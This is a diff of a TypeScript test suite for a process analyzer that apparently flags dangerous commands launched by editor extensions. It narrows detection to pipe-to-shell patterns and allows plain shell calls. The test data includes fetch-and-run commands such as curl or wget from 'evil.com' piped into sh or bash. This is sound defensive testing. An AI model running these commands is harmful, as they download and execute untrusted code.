@@ -183,9 +183,9 @@ suite('ProcessAnalyzer Tests', () => {
   });
 
   suite('Rule Matching - Command Injection', () => {
-    test('should detect bash command', () => {
+    test('should detect pipe to sh', () => {
       const extensionInfo = createMockExtensionInfo('test.extension', true);
-      const event = new ExecEvent('bash', ['-c', 'echo hello'], {}, __filename, extensionInfo);
+      const event = new ExecEvent('curl', ['http://evil.com', '|', 'sh'], {}, __filename, extensionInfo);
 
       const result = analyzer.analyze(event);
 
@@ -193,22 +193,34 @@ suite('ProcessAnalyzer Tests', () => {
       expect(result!.securityEvent).to.exist;
     });
 
-    test('should detect sh command', () => {
+    test('should detect pipe to bash', () => {
       const extensionInfo = createMockExtensionInfo('test.extension', true);
-      const event = new ExecEvent('sh', ['-c', 'ls'], {}, __filename, extensionInfo);
+      const event = new ExecEvent('wget', ['-O-', 'http://evil.com', '|', 'bash'], {}, __filename, extensionInfo);
 
       const result = analyzer.analyze(event);
 
       expect(result!.verdict.allowed).to.be.false;
+      expect(result!.securityEvent).to.exist;
     });
 
-    test('should detect zsh command', () => {
+    test('should detect pipe to zsh', () => {
       const extensionInfo = createMockExtensionInfo('test.extension', true);
-      const event = new ExecEvent('zsh', ['-c', 'pwd'], {}, __filename, extensionInfo);
+      const event = new ExecEvent('echo', ['malicious', '|', 'zsh'], {}, __filename, extensionInfo);
 
       const result = analyzer.analyze(event);
 
       expect(result!.verdict.allowed).to.be.false;
+      expect(result!.securityEvent).to.exist;
+    });
+
+    test('should detect pipe to cmd', () => {
+      const extensionInfo = createMockExtensionInfo('test.extension', true);
+      const event = new ExecEvent('type', ['file.txt', '|', 'cmd'], {}, __filename, extensionInfo);
+
+      const result = analyzer.analyze(event);
+
+      expect(result!.verdict.allowed).to.be.false;
+      expect(result!.securityEvent).to.exist;
     });
 
     test('should detect curl command', () => {
@@ -218,6 +230,7 @@ suite('ProcessAnalyzer Tests', () => {
       const result = analyzer.analyze(event);
 
       expect(result!.verdict.allowed).to.be.false;
+      expect(result!.securityEvent).to.exist;
     });
 
     test('should detect wget command', () => {
@@ -227,15 +240,79 @@ suite('ProcessAnalyzer Tests', () => {
       const result = analyzer.analyze(event);
 
       expect(result!.verdict.allowed).to.be.false;
+      expect(result!.securityEvent).to.exist;
     });
 
-    test('should be case-insensitive', () => {
+    test('should be case-insensitive for curl', () => {
       const extensionInfo = createMockExtensionInfo('test.extension', true);
       const event = new ExecEvent('CURL', ['http://example.com'], {}, __filename, extensionInfo);
 
       const result = analyzer.analyze(event);
 
       expect(result!.verdict.allowed).to.be.false;
+      expect(result!.securityEvent).to.exist;
+    });
+
+    test('should allow standalone bash command', () => {
+      const extensionInfo = createMockExtensionInfo('test.extension', true);
+      const event = new ExecEvent('bash', ['-c', 'echo hello'], {}, __filename, extensionInfo);
+
+      const result = analyzer.analyze(event);
+
+      expect(result!.verdict.allowed).to.be.true;
+      expect(result!.securityEvent).to.be.undefined;
+    });
+
+    test('should allow standalone sh command', () => {
+      const extensionInfo = createMockExtensionInfo('test.extension', true);
+      const event = new ExecEvent('sh', ['-c', 'ls'], {}, __filename, extensionInfo);
+
+      const result = analyzer.analyze(event);
+
+      expect(result!.verdict.allowed).to.be.true;
+      expect(result!.securityEvent).to.be.undefined;
+    });
+
+    test('should allow standalone zsh command', () => {
+      const extensionInfo = createMockExtensionInfo('test.extension', true);
+      const event = new ExecEvent('zsh', ['-c', 'pwd'], {}, __filename, extensionInfo);
+
+      const result = analyzer.analyze(event);
+
+      expect(result!.verdict.allowed).to.be.true;
+      expect(result!.securityEvent).to.be.undefined;
+    });
+
+    test('should allow Cursor dump_zsh_state script', () => {
+      const extensionInfo = createMockExtensionInfo('test.extension', true);
+      const event = new ExecEvent(
+        '/bin/zsh',
+        ['-o', 'extendedglob', '-ilc', 'function dump_zsh_state() { typeset -xp }; dump_zsh_state'],
+        {},
+        __filename,
+        extensionInfo,
+      );
+
+      const result = analyzer.analyze(event);
+
+      expect(result!.verdict.allowed).to.be.true;
+      expect(result!.securityEvent).to.be.undefined;
+    });
+
+    test('should allow git command with .sh file argument', () => {
+      const extensionInfo = createMockExtensionInfo('test.extension', true);
+      const event = new ExecEvent(
+        '/opt/homebrew/bin/git',
+        ['ls-tree', '-l', 'HEAD', '--', 'tools/dd-ai-helper/examples.sh'],
+        {},
+        __filename,
+        extensionInfo,
+      );
+
+      const result = analyzer.analyze(event);
+
+      expect(result!.verdict.allowed).to.be.true;
+      expect(result!.securityEvent).to.be.undefined;
     });
   });
 
@@ -249,9 +326,9 @@ suite('ProcessAnalyzer Tests', () => {
       expect(result!.verdict.allowed).to.be.false;
     });
 
-    test('should match command pattern in full command with args', () => {
+    test('should match pipe-to-shell pattern in full command with args', () => {
       const extensionInfo = createMockExtensionInfo('test.extension', true);
-      const event = new ExecEvent('/usr/bin/bash', ['-c', 'echo test'], {}, __filename, extensionInfo);
+      const event = new ExecEvent('curl', ['http://evil.com', '|', 'sh'], {}, __filename, extensionInfo);
 
       const result = analyzer.analyze(event);
 
@@ -335,7 +412,7 @@ suite('ProcessAnalyzer Tests', () => {
 
     test('should set correct confidence', () => {
       const extensionInfo = createMockExtensionInfo('test.extension', true);
-      const event = new ExecEvent('bash', ['-c', 'test'], {}, __filename, extensionInfo);
+      const event = new ExecEvent('curl', ['http://example.com'], {}, __filename, extensionInfo);
 
       const result = analyzer.analyze(event);
 
